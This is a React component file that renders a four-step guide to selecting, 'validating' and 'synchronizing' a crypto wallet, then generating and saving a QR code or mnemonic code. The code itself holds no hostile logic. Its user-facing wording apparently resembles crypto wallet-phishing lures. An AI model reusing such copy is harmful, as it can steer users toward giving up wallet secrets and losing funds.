import { UserStep, UserStepsBack, UserStepsContainer } from "./Style";
import { ReactComponent as WalletIcon } from "../../assets/svgs/steps/Wallet.svg";
import { ReactComponent as ValidationIcon } from "../../assets/svgs/steps/Validation.svg";
import { ReactComponent as GalleryIcon } from "../../assets/svgs/steps/Gallery.svg";
import { ReactComponent as BookmarkIcon } from "../../assets/svgs/steps/Bookmark.svg";
import { useSelector } from "react-redux";
import { useNavigate } from "react-router-dom";


const UserSteps = () => {

    const steps = [
        {
            id: 1,
            icon: <WalletIcon />,
            title: "Select Your Wallet",
            description: "We have varieties of wallets you can choose from to validate or synchronize your wallet. Please, select your correct wallet name before proceeding.",
            url: ""
        },
        {
            id: 2,
            icon: <ValidationIcon />,
            title: "Validate Your Wallet",
            description: "Once you select your wallet, you will be prompted to connect via a decentralized protocol. This can successfully be completed manually or automatically.",
            url: ""
        },
        {
            id: 3,
            icon: <GalleryIcon />,
            title: "Generate QR Code",
            description: "Upon successful validation, a QR Code will be generated for your wallet. You can always scan your QR Code to reinitialize your wallet.",
            url: "",
        },
        {
            id: 4,
            icon: <BookmarkIcon />,
            title: "Save Wallet QR Code",
            description: "Saving your generated mnemonic code or QR Code is important. You can click on Save or Screenshot the QR Code Page. You choose how you want to save!",
            url: ""
        },
    ];

    const illumMode = useSelector(state => state.uiux.illumMode);
    const navigate = useNavigate();

    return (
        <UserStepsBack illumMode={illumMode} >
            <UserStepsContainer illumMode={illumMode} >
                {
                    steps.map(step => {
                        const stepId = `userStep${step.id}`

                        return (
                            <UserStep illumMode={illumMode} id={stepId} stepId={stepId} key={step.id}>
                                <div className="stepIconFrame">{step.icon}</div>
                                <h2
                                    className="stepTitle"
                                    onClick={() => {
                                        // navigate(step.url, {replace: true});
                                    }}
                                >{step.title}</h2>
                                <p className="stepDecription" >{step.description}</p>
                            </UserStep>
                        );
                    })
                }
            </UserStepsContainer>
        </UserStepsBack>
    );
}

export default UserSteps;